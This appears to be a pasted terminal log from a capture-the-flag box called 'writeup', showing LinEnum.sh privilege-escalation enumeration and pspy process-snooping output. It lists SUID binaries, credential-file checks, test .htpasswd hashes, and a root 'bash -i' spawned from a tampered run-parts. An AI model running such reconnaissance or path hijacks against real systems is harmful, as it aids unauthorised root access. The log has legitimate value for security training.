+root       111  0.0  0.0      0     0 ?        S    13:47   0:00 [scsi_eh_2]         
+root       113  0.0  0.0      0     0 ?        S<   13:47   0:00 [scsi_tmf_2]        
+root       115  0.0  0.0      0     0 ?        S    13:47   0:00 [kworker/u2:2]      
+root       128  0.0  0.0      0     0 ?        S<   13:47   0:00 [bioset]            
+root       130  0.0  0.0      0     0 ?        S<   13:47   0:00 [kworker/0:1H]      
+root       155  0.0  0.0      0     0 ?        S<   13:47   0:00 [kworker/u3:0]      
+root       161  0.0  0.0      0     0 ?        S    13:47   0:00 [jbd2/sda1-8]       
+root       162  0.0  0.0      0     0 ?        S<   13:47   0:00 [ext4-rsv-conver]   
+root       355  0.0  0.3  39236  4052 ?        Ss   13:47   0:00 udevd --daemon      
+root       395  0.0  0.0      0     0 ?        S<   13:47   0:00 [ttm_swap]          
+root      1304  0.0  0.2 250108  2284 ?        Ssl  13:47   0:00 /usr/sbin/rsyslogd  
+root      1444  0.0  1.0 163432 10420 ?        Sl   13:47   0:17 /usr/sbin/vmtoolsd  
+root      1477  0.0  1.0  66316 10412 ?        S    13:47   0:00 /usr/lib/vmware-vgauth/VGAuthService -s                                                                   
+root      1563  0.0  2.8 330848 28920 ?        Ss   13:47   0:00 /usr/sbin/apache2 -k start                                                                                
+root      1622  0.0  0.2  29664  2488 ?        Ss   13:47   0:00 /usr/sbin/cron      
+message+  1638  0.0  0.2  32744  2528 ?        Ss   13:47   0:00 /usr/bin/dbus-daemon --system                                                                             
+root      1678  0.0  0.2  28528  2948 ?        S    13:47   0:00 /usr/sbin/elogind -D                                                                                      
+root      1749  0.0  0.2   9776  2908 ?        S    13:47   0:00 /bin/bash /usr/bin/mysqld_safe                                                                            
+root      1782  0.0  1.5 431184 16048 ?        Sl   13:47   0:11 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -b                                   
+mysql     1926  0.0  8.0 654008 82204 ?        Sl   13:47   0:18 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb18/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306                                                
+root      1927  0.0  0.0   4192   620 ?        S    13:47   0:00 logger -t mysqld -p daemon error                                                                          
+root      2039  0.0  0.1  14520  1872 tty1     Ss+  13:47   0:00 /sbin/getty 38400 tty1                                                                                    
+root      2040  0.0  0.1  14520  1692 tty2     Ss+  13:47   0:00 /sbin/getty 38400 tty2                                                                                    
+root      2041  0.0  0.1  14520  1872 tty3     Ss+  13:47   0:00 /sbin/getty 38400 tty3                                                                                    
+root      2042  0.0  0.1  14520  1632 tty4     Ss+  13:47   0:00 /sbin/getty 38400 tty4                                                                                    
+root      2043  0.0  0.1  14520  1628 tty5     Ss+  13:47   0:00 /sbin/getty 38400 tty5                                                                                    
+root      2044  0.0  0.1  14520  1792 tty6     Ss+  13:47   0:00 /sbin/getty 38400 tty6                                                                                    
+root      2140  0.0  0.0      0     0 ?        S    13:48   0:00 [kauditd]           
+www-data  2369  0.0  2.1 333632 22248 ?        S    14:35   0:11 /usr/sbin/apache2 -k start                                                                                
+www-data  2424  0.0  2.1 333604 22040 ?        S    14:52   0:11 /usr/sbin/apache2 -k start                                                                                
+www-data  2457  0.0  2.2 333624 22952 ?        S    14:59   0:12 /usr/sbin/apache2 -k start                                                                                
+www-data  2458  0.0  2.1 333568 21992 ?        S    14:59   0:10 /usr/sbin/apache2 -k start                                                                                
+www-data  2459  0.0  2.1 333588 21516 ?        S    14:59   0:11 /usr/sbin/apache2 -k start                                                                                
+www-data  2460  0.0  2.1 333596 21956 ?        S    14:59   0:08 /usr/sbin/apache2 -k start                                                                                
+www-data  2563  0.0  2.1 333592 22016 ?        S    15:30   0:06 /usr/sbin/apache2 -k start                                                                                
+root      3708  0.0  0.7 108796  7360 ?        Ss   17:51   0:00 sshd: jkr [priv]    
+jkr       3715  0.0  0.4 108796  4320 ?        S    17:51   0:00 sshd: jkr@pts/1     
+jkr       3716  0.0  0.3  19884  3724 pts/1    Ss   17:51   0:00 -bash               
+root     12935  0.0  0.6 108644  7008 ?        Ss   18:58   0:00 sshd: jkr [priv]    
+root     12937  0.0  0.0   4276   752 ?        S    18:58   0:00 sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new                                      
+root     12938  0.0  0.2  17940  2932 ?        S    18:58   0:00 bin/bash /usr/local/bin/run-parts --lsbsysinit /etc/update-motd.d                                         
+root     12939  0.0  0.3  18172  3292 ?        S    18:58   0:00 /bin/bash -i        
+jkr      12941  0.0  0.3  23808  3632 pts/1    S+   18:58   0:00 nano run-parts      
+root     13032  0.0  0.3  69952  3912 ?        Ss   19:13   0:00 /usr/sbin/sshd      
+root     13114  0.0  0.7 108764  7408 ?        Ss   19:28   0:00 sshd: root@pts/0    
+root     13120  0.0  0.3  19864  3624 pts/0    Ss+  19:28   0:00 -bash               
+www-data 13313  0.0  0.8 330920  8700 ?        S    20:25   0:00 /usr/sbin/apache2 -k start                                                                                
+root     13396  0.0  0.0      0     0 ?        S    20:47   0:00 [kworker/0:1]       
+root     13412  0.0  0.0      0     0 ?        S    20:52   0:00 [kworker/0:0]       
+root     13425  0.0  0.7 108796  7456 ?        Ss   20:56   0:00 sshd: jkr [priv]    
+jkr      13431  0.0  0.4 108796  4552 ?        S    20:56   0:00 sshd: jkr@pts/2     
+jkr      13432  0.0  0.3  19916  3792 pts/2    Ss   20:56   0:00 -bash               
+jkr      13442  0.0  0.4  12164  4100 pts/2    S+   20:57   0:00 bash LinEnum.sh     
+jkr      13443  0.0  0.3  12216  3716 pts/2    S+   20:57   0:00 bash LinEnum.sh     
+jkr      13444  0.0  0.0   5832   668 pts/2    S+   20:57   0:00 tee -a              
+jkr      13670  0.0  0.2  12216  3024 pts/2    S+   20:57   0:00 bash LinEnum.sh     
+jkr      13671  0.0  0.2  19188  2592 pts/2    R+   20:57   0:00 ps aux              
+
+
+[-] Process binaries and associated permissions (from above list):                   
+1.1M -rwxr-xr-x 1 root root 1.1M May 15  2017 /bin/bash                              
+   0 lrwxrwxrwx 1 root root    6 May  4  2018 /sbin/getty -> agetty                  
+220K -rwxr-xr-x 1 root root 218K Mar 16  2019 /usr/bin/dbus-daemon                   
+   0 lrwxrwxrwx 1 root root    9 Jan 20  2017 /usr/bin/python3 -> python3.5          
+   0 lrwxrwxrwx 1 root root   37 Aug 23 05:16 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin64/appLoader                                                
+652K -rwxr-xr-x 1 root root 652K Apr  2  2019 /usr/sbin/apache2                      
+ 48K -rwxr-xr-x 1 root root  48K Oct  7  2017 /usr/sbin/cron                         
+624K -rwxr-xr-x 1 root root 624K Feb 22  2018 /usr/sbin/elogind                      
+ 17M -rwxr-xr-x 1 root root  17M Aug  8  2018 /usr/sbin/mysqld                       
+628K -rwxr-xr-x 1 root root 627K Jan 14  2018 /usr/sbin/rsyslogd                     
+776K -rwxr-xr-x 1 root root 773K Mar  1  2019 /usr/sbin/sshd                         
+   0 lrwxrwxrwx 1 root root   37 Aug 23 05:16 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin64/vmtoolsd                                                                  
+
+
+[-] /etc/init.d/ binary permissions:      
+total 292                                 
+drwxr-xr-x  2 root root  4096 Aug 23 05:16 .                                         
+drwxr-xr-x 81 root root  4096 Aug 23 05:16 ..                                        
+-rwxr-xr-x  1 root root  8181 Nov  3  2018 apache2                                   
+-rwxr-xr-x  1 root root  2489 Nov  3  2018 apache-htcacheclean                       
+-rwxr-xr-x  1 root root  1276 Jun 15  2017 bootlogs                                  
+-rwxr-xr-x  1 root root  1248 Jun 15  2017 bootmisc.sh                               
+-rwxr-xr-x  1 root root  3807 Jun 15  2017 checkfs.sh                                
+-rwxr-xr-x  1 root root  1072 Jun 15  2017 checkroot-bootclean.sh                    
+-rwxr-xr-x  1 root root  9353 Jun 15  2017 checkroot.sh                              
+-rwxr-xr-x  1 root root  1232 Apr  6  2017 console-setup.sh                          
+-rwxr-xr-x  1 root root  3049 Oct  7  2017 cron                                      
+-rwxr-xr-x  1 root root  3340 Mar 16  2019 dbus                                      
+-rw-r--r--  1 root root  1206 Aug 23 05:16 .depend.boot                              
+-rw-r--r--  1 root root   628 Aug 23 05:16 .depend.start                             
+-rw-r--r--  1 root root   790 Aug 23 05:16 .depend.stop                              
+-rwxr-xr-x  1 root root  2468 Feb 22  2018 elogind                                   
+-rwxr-xr-x  1 root root  6469 Apr  6  2018 eudev                                     
+-rwxr-xr-x  1 root root  6697 Apr 17  2017 fail2ban                                  
+-rwxr-xr-x  1 root root  1336 Jun 15  2017 halt                                      
+-rwxr-xr-x  1 root root  1423 Jun 15  2017 hostname.sh                               
+-rwxr-xr-x  1 root root  3809 May  4  2018 hwclock.sh                                
+-rwxr-xr-x  1 root root  2448 Dec 30  2016 irqbalance                                
+-rwxr-xr-x  1 root root  1479 May 18  2016 keyboard-setup.sh                         
+-rwxr-xr-x  1 root root  1300 Jun 15  2017 killprocs                                 
+-rwxr-xr-x  1 root root  2044 Dec 25  2016 kmod                                      
+-rwxr-xr-x  1 root root   995 Jun 15  2017 motd                                      
+-rwxr-xr-x  1 root root   677 Jun 15  2017 mountall-bootclean.sh                     
+-rwxr-xr-x  1 root root  2301 Jun 15  2017 mountall.sh                               
+-rwxr-xr-x  1 root root  1461 Jun 15  2017 mountdevsubfs.sh                          
+-rwxr-xr-x  1 root root  1564 Jun 15  2017 mountkernfs.sh                            
+-rwxr-xr-x  1 root root   685 Jun 15  2017 mountnfs-bootclean.sh                     
+-rwxr-xr-x  1 root root  2456 Jun 15  2017 mountnfs.sh                               
+-rwxr-xr-x  1 root root  5930 Aug 10  2017 mysql                                     
+-rwxr-xr-x  1 root root  1364 Mar 17  2017 netfilter-persistent                      
+-rwxr-xr-x  1 root root  4597 Sep 16  2016 networking                                
+-rwxr-xr-x  1 root root  1191 Jun  5  2018 procps                                    
+-rwxr-xr-x  1 root root  6290 Jun  7  2017 rc                                        
+-rwxr-xr-x  1 root root   820 Jun 15  2017 rc.local                                  
+-rwxr-xr-x  1 root root   117 Jun  7  2017 rcS                                       
+-rw-r--r--  1 root root  2427 Jun  7  2017 README                                    
+-rwxr-xr-x  1 root root   661 Jun 15  2017 reboot                                    
+-rwxr-xr-x  1 root root  1042 Jun 15  2017 rmnologin                                 
+-rwxr-xr-x  1 root root  4355 Dec 10  2017 rsync                                     
+-rwxr-xr-x  1 root root  2875 Jan 14  2018 rsyslog                                   
+-rwxr-xr-x  1 root root  3207 Jun 15  2017 sendsigs                                  
+-rwxr-xr-x  1 root root   597 Jun 15  2017 single                                    
+-rw-r--r--  1 root root  1087 Jun 15  2017 skeleton                                  
+-rwxr-xr-x  1 root root  4033 Mar  1  2019 ssh                                       
+-rwxr-xr-x  1 root root  2748 Jun 15  2017 umountfs                                  
+-rwxr-xr-x  1 root root  2202 Jun 15  2017 umountnfs.sh                              
+-rwxr-xr-x  1 root root  1234 Jun 15  2017 umountroot                                
+-rwxr-xr-x  1 root root  3111 Jun 15  2017 urandom                                   
+-rwxr-xr-x  1 root root 45893 Aug 23 05:16 vmware-tools                              
+
+
+[-] /etc/init/ config file permissions:   
+total 36                                  
+drwxr-xr-x  2 root root 4096 Apr 19  2019 .                                          
+drwxr-xr-x 81 root root 4096 Aug 23 05:16 ..                                         
+-rw-r--r--  1 root root  579 Sep  9  2014 irqbalance.conf                            
+-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf                            
+-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf                     
+-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf           
+-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf            
+-rw-r--r--  1 root root  637 Mar  1  2019 ssh.conf                                   
+-rw-r--r--  1 root root  581 Jul 28  2016 startpar-bridge.conf                       
+
+
+[-] /lib/systemd/* config file permissions:                                          
+/lib/systemd/:                            
+total 4.0K                                
+drwxr-xr-x 7 root root 4.0K Apr 24  2019 system                                      
+
+/lib/systemd/system:                      
+total 140K                                
+drwxr-xr-x 2 root root 4.0K Apr 19  2019 mariadb@bootstrap.service.d                 
+drwxr-xr-x 2 root root 4.0K Apr 19  2019 basic.target.wants                          
+drwxr-xr-x 2 root root 4.0K Apr 19  2019 halt.target.wants                           
+drwxr-xr-x 2 root root 4.0K Apr 19  2019 poweroff.target.wants                       
+drwxr-xr-x 2 root root 4.0K Apr 19  2019 reboot.target.wants                         
+-rw-r--r-- 1 root root  445 Mar  1  2019 ssh.service                                 
+-rw-r--r-- 1 root root  196 Mar  1  2019 ssh@.service                                
+-rw-r--r-- 1 root root  216 Mar  1  2019 ssh.socket                                  
+-rw-r--r-- 1 root root  225 Jan 18  2019 apt-daily.service                           
+-rw-r--r-- 1 root root  156 Jan 18  2019 apt-daily.timer                             
+-rw-r--r-- 1 root root  238 Jan 18  2019 apt-daily-upgrade.service                   
+-rw-r--r-- 1 root root  184 Jan 18  2019 apt-daily-upgrade.timer                     
+-rw-r--r-- 1 root root  346 Nov  3  2018 apache2.service                             
+-rw-r--r-- 1 root root  418 Nov  3  2018 apache2@.service                            
+-rw-r--r-- 1 root root  528 Nov  3  2018 apache-htcacheclean.service                 
+-rw-r--r-- 1 root root  537 Nov  3  2018 apache-htcacheclean@.service                
+-rw-r--r-- 1 root root 4.5K Aug  8  2018 mariadb.service                             
+-rw-r--r-- 1 root root 5.6K Aug  8  2018 mariadb@.service                            
+-rw-r--r-- 1 root root  251 Oct  7  2017 cron.service                                
+-rw-r--r-- 1 root root  406 Apr 17  2017 fail2ban.service                            
+-rw-r--r-- 1 root root  456 Mar 18  2017 netfilter-persistent.service                
+-rw-r--r-- 1 root root  333 Mar 10  2017 irqbalance.service                          
+-rw-r--r-- 1 root root  432 Jan 25  2017 console-kit-daemon.service                  
+-rw-r--r-- 1 root root  219 Jan 25  2017 console-kit-log-system-restart.service      
+-rw-r--r-- 1 root root  201 Jan 25  2017 console-kit-log-system-start.service        
+-rw-r--r-- 1 root root  218 Jan 25  2017 console-kit-log-system-stop.service         
+-rw-r--r-- 1 root root  552 Jan 10  2017 ifup@.service                               
+-rw-r--r-- 1 root root  175 Jan  1  2017 phpsessionclean.service                     
+-rw-r--r-- 1 root root  144 Jan  1  2017 phpsessionclean.timer                       
+-rw-r--r-- 1 root root  735 Oct 19  2016 networking.service                          
+-rw-r--r-- 1 root root  312 May 19  2016 console-setup.service                       
+-rw-r--r-- 1 root root  287 May 18  2016 keyboard-setup.service                      
+-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service                               
+
+/lib/systemd/system/mariadb@bootstrap.service.d:                                     
+total 4.0K                                
+-rw-r--r-- 1 root root 533 Aug  8  2018 use_galera_new_cluster.conf                  
+
+/lib/systemd/system/basic.target.wants:   
+total 0                                   
+lrwxrwxrwx 1 root root 39 Jan 25  2017 console-kit-log-system-start.service -> ../console-kit-log-system-start.service                                                     
+
+/lib/systemd/system/halt.target.wants:    
+total 0                                   
+lrwxrwxrwx 1 root root 38 Jan 25  2017 console-kit-log-system-stop.service -> ../console-kit-log-system-stop.service                                                       
+
+/lib/systemd/system/poweroff.target.wants:                                           
+total 0                                   
+lrwxrwxrwx 1 root root 38 Jan 25  2017 console-kit-log-system-stop.service -> ../console-kit-log-system-stop.service                                                       
+
+/lib/systemd/system/reboot.target.wants:  
+total 0                                   
+lrwxrwxrwx 1 root root 41 Jan 25  2017 console-kit-log-system-restart.service -> ../console-kit-log-system-restart.service                                                 
+
+
+### SOFTWARE #############################################                           
+[-] MYSQL version:                        
+mysql  Ver 15.1 Distrib 10.1.37-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                                  
+
+
+[-] Apache user configuration:            
+APACHE_RUN_USER=www-data                  
+APACHE_RUN_GROUP=www-data                 
+
+
+[-] htpasswd found - could contain passwords:                                        
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd                                                                          
+username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30                                  
+4105bbb04                                 
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd                                                                               
+username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8                                
+05bbb04                                   
+anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a                               
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd                                                                         
+username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/                                       
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd                                                                                
+username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.                                       
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd                                                                               
+username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04                        
+/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd                                                                                    
+username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04                        
+
+
+[-] www home dir contents:                
+/var/www/:                                
+total 12K                                 
+drwxr-xr-x  3 root root 4.0K Apr 19  2019 .                                          
+drwxr-xr-x 12 root root 4.0K Apr 19  2019 ..                                         
+drwxr-xr-x  3 root root 4.0K Apr 24  2019 html                                       
+
+/var/www/html:                            
+total 20K                                 
+drwxr-xr-x 3 root     root     4.0K Apr 24  2019 .                                   
+drwxr-xr-x 3 root     root     4.0K Apr 19  2019 ..                                  
+-rw-r--r-- 1 root     root     3.0K Apr 24  2019 index.html                          
+-rw-r--r-- 1 root     root      310 Apr 24  2019 robots.txt                          
+drwx------ 9 www-data www-data 4.0K Apr 19  2019 writeup                             
+
+
+### INTERESTING FILES ####################################                           
+[-] Useful file locations:                
+/usr/bin/wget                             
+
+
+[-] Can we read/write sensitive files:    
+-rw-r--r-- 1 root root 1111 Apr 19  2019 /etc/passwd                                 
+-rw-r--r-- 1 root root 582 Apr 19  2019 /etc/group                                   
+-rw-r--r-- 1 root root 767 Jun  3  2018 /etc/profile                                 
+-rw-r----- 1 root shadow 805 Apr 19  2019 /etc/shadow                                
+
+
+[-] SUID files:                           
+-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su                                    
+-rwsr-xr-x 1 root root 40200 May  4  2018 /bin/mount                                 
+-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping                                  
+-rwsr-xr-x 1 root root 27616 May  4  2018 /bin/umount                                
+-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd                           
+-rwsr-xr-x 1 root root 27448 Mar 18  2019 /usr/bin/pkexec                            
+-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn                              
+-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd                            
+-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp                            
+-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh                              
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device          
+-rwsr-xr-x 1 root root 14848 Mar 18  2019 /usr/lib/policykit-1/polkit-agent-helper-1 
+-rwsr-xr-x 1 root root 440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign              
+-r-sr-xr-x 1 root root 14320 Aug 23 05:16 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper                                                                             
+-r-sr-xr-x 1 root root 13628 Aug 23 05:16 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper                                                                             
+-rwsr-xr-- 1 root messagebus 44048 Mar 16  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                
+
+
+[-] SGID files:                           
+-rwxr-sr-x 1 root shadow 71856 May 17  2017 /usr/bin/chage                           
+-rwxr-sr-x 1 root shadow 22808 May 17  2017 /usr/bin/expiry                          
+-rwxr-sr-x 1 root crontab 40264 Oct  7  2017 /usr/bin/crontab                        
+-rwxr-sr-x 1 root tty 27440 May  4  2018 /usr/bin/wall                               
+-rwxr-sr-x 1 root ssh 358624 Mar  1  2019 /usr/bin/ssh-agent                         
+-rwxr-sr-x 1 root tty 14768 Apr 12  2017 /usr/bin/bsd-write                          
+-rwxr-sr-x 1 root shadow 35592 May 27  2017 /sbin/unix_chkpwd                        
+
+
+[+] Private SSH keys found!:              
+/home/jkr/LinEnum.sh                      
+
+
+[+] AWS secret keys found!:               
+/home/jkr/LinEnum.sh                      
+
+
+[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems                                                                                    
+# /etc/fstab: static file system information.                                        
+#                                         
+# Use 'blkid' to print the universally unique identifier for a                       
+# device; this may be used with UUID= as a more robust way to name devices           
+# that works even if disks are added and removed. See fstab(5).                      
+#                                         
+# <file system> <mount point>   <type>  <options>       <dump>  <pass>               
+# / was on /dev/sda1 during installation  
+UUID=315a7d63-4cbd-4bee-9832-1a2944ef088e /               ext4    errors=remount-ro 0       1                                                                              
+# swap was on /dev/sda5 during installation                                          
+UUID=a7b3d7b3-2584-435d-ab69-37b17a21a74d none            swap    sw              0       0                                                                                
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0                
+
+
+[-] Can't search *.conf files as no keyword was entered                              
+
+[-] Can't search *.php files as no keyword was entered                               
+
+[-] Can't search *.log files as no keyword was entered                               
+
+[-] Can't search *.ini files as no keyword was entered                               
+
+[-] All *.conf files in /etc (recursive 1 level):                                    
+-rw-r--r-- 1 root root 34 Apr  9  2017 /etc/ld.so.conf                               
+-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf                               
+-rw-r--r-- 1 root root 859 Jul 13  2016 /etc/insserv.conf                            
+-rw-r--r-- 1 root root 61 Apr 19  2019 /etc/resolv.conf                              
+-rw-r--r-- 1 root root 2683 Jun  5  2018 /etc/sysctl.conf                            
+-rw-r--r-- 1 root root 973 Jan 31  2017 /etc/mke2fs.conf                             
+-rw-r--r-- 1 root root 497 Dec 31  2017 /etc/nsswitch.conf                           
+-rw-r--r-- 1 root root 2981 Apr 19  2019 /etc/adduser.conf                           
+-rw-r--r-- 1 root root 144 Apr 19  2019 /etc/kernel-img.conf                         
+-rw-r--r-- 1 root root 9 Jun  3  2018 /etc/host.conf                                 
+-rw-r--r-- 1 root root 552 May 27  2017 /etc/pam.conf                                
+-rw-r--r-- 1 root root 2584 Aug  1  2016 /etc/gai.conf                               
+-rw-r--r-- 1 root root 1963 Jan 14  2018 /etc/rsyslog.conf                           
+-rw-r--r-- 1 root root 191 Apr 12  2017 /etc/libaudit.conf                           
+-rw-r--r-- 1 root root 2969 May 21  2017 /etc/debconf.conf                           
+-rw-r--r-- 1 root root 346 Feb 26  2018 /etc/discover-modprobe.conf                  
+-rw-r--r-- 1 root root 599 May  5  2015 /etc/logrotate.conf                          
+-rw-r--r-- 1 root root 604 Jun 26  2016 /etc/deluser.conf                            
+
+
+[-] Current user's history files:         
+lrwxrwxrwx 1 root root 9 Apr 19  2019 /home/jkr/.bash_history -> /dev/null           
+
+
+[-] Location and contents (if accessible) of .bash_history file(s):                  
+/home/jkr/.bash_history                   
+
+
+[-] Location and Permissions (if accessible) of .bak file(s):                        
+-rw------- 1 root shadow 482 Apr 19  2019 /var/backups/gshadow.bak                   
+-rw------- 1 root root 1111 Apr 19  2019 /var/backups/passwd.bak                     
+-rw------- 1 root shadow 805 Apr 19  2019 /var/backups/shadow.bak                    
+-rw------- 1 root root 579 Apr 19  2019 /var/backups/group.bak                       
+
+
+[-] Any interesting mail in /var/mail:    
+total 8                                   
+drwxrwsr-x  2 root mail 4096 Apr 19  2019 .                                          
+drwxr-xr-x 12 root root 4096 Apr 19  2019 ..                                         
+
+
+### SCAN COMPLETE ####################################                               
+jkr@writeup:~$ cd /tmp/                   
+jkr@writeup:/tmp$ ls                      
+PleaseSubscribe  pspy64s  subs2  try3  try7  try8  vmware-root  vmware-root_1444-2697598208                                                                                
+jkr@writeup:/tmp$ ./pspy64s               
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855        
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓   
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒   
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░   
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░   
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░   
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒    
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░    
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░     
+                   ░           ░ ░        
+                               ░ ░        
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)                     
+Draining file system events due to startup...                                        
+done                                      
+2020/01/05 21:07:26 CMD: UID=0    PID=9      |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=85     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=8      |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=78     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=77     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=76     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=7      |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=5      |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=43     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=42     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=41     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=395    |                                       
+2020/01/05 21:07:26 CMD: UID=1000 PID=3716   | -bash                                 
+2020/01/05 21:07:26 CMD: UID=1000 PID=3715   | sshd: jkr@pts/1                       
+2020/01/05 21:07:26 CMD: UID=0    PID=3708   | sshd: jkr [priv]                      
+2020/01/05 21:07:26 CMD: UID=0    PID=355    | udevd --daemon                        
+2020/01/05 21:07:26 CMD: UID=0    PID=3      |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=29     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=28     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=27     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=26     |                                       
+2020/01/05 21:07:26 CMD: UID=33   PID=2563   | /usr/sbin/apache2 -k start            
+2020/01/05 21:07:26 CMD: UID=0    PID=25     |                                       
+2020/01/05 21:07:26 CMD: UID=33   PID=2460   | /usr/sbin/apache2 -k start            
+2020/01/05 21:07:26 CMD: UID=33   PID=2459   | /usr/sbin/apache2 -k start            
+2020/01/05 21:07:26 CMD: UID=33   PID=2458   | /usr/sbin/apache2 -k start            
+2020/01/05 21:07:26 CMD: UID=33   PID=2457   | /usr/sbin/apache2 -k start            
+2020/01/05 21:07:26 CMD: UID=33   PID=2424   | /usr/sbin/apache2 -k start            
+2020/01/05 21:07:26 CMD: UID=0    PID=24     |                                       
+2020/01/05 21:07:26 CMD: UID=33   PID=2369   | /usr/sbin/apache2 -k start            
+2020/01/05 21:07:26 CMD: UID=0    PID=23     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=22     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=2140   |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=21     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=2044   | /sbin/getty 38400 tty6                
+2020/01/05 21:07:26 CMD: UID=0    PID=2043   | /sbin/getty 38400 tty5                
+2020/01/05 21:07:26 CMD: UID=0    PID=2042   | /sbin/getty 38400 tty4                
+2020/01/05 21:07:26 CMD: UID=0    PID=2041   | /sbin/getty 38400 tty3                
+2020/01/05 21:07:26 CMD: UID=0    PID=2040   | /sbin/getty 38400 tty2                
+2020/01/05 21:07:26 CMD: UID=0    PID=2039   | /sbin/getty 38400 tty1                
+2020/01/05 21:07:26 CMD: UID=0    PID=2      |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=1927   | logger -t mysqld -p daemon error      
+2020/01/05 21:07:26 CMD: UID=103  PID=1926   | /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb18/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306                                                                  
+2020/01/05 21:07:26 CMD: UID=0    PID=19     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=18     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=1782   | /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -b           
+2020/01/05 21:07:26 CMD: UID=0    PID=1749   | /bin/bash /usr/bin/mysqld_safe        
+2020/01/05 21:07:26 CMD: UID=0    PID=17     |                                       
+2020/01/05 21:07:26 CMD: UID=0    PID=1678   | /usr/sbin/elogind -D                  
+2020/01/05 21:07:26 CMD: UID=101  PID=1638   | /usr/bin/dbus-daemon --system         
+2020/01/05 21:07:26 CMD: UID=0    PID=1622   | /usr/sbin/cron                        
+2020/01/05 21:07:26 CMD: UID=0    PID=162    |                                       
